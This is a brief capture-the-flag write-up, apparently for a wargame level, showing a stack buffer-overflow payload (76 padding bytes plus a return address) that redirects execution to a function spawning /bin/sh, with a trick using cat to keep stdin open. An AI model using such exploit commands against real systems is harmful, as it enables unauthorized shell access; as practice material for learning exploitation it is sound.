python -c 'print "A"*76 + "\x44\x84\x04\x08"' > tmp
./level1 tmp

We need to do a buffer overflow and execute the run function which runs a system("/bin/sh")
delphin is smart so <3, simply doing ./level1 < tmp doesn't work because the stdin is closed after the pipe so the shell is directly closed
We need to use a fifo to keep the stdin open
To keep the control of stdin we need to do a cat which will keep the stdin open

final command: (python -c 'print "A"*76 + "\x44\x84\x04\x08"' ; cat) | ./level1
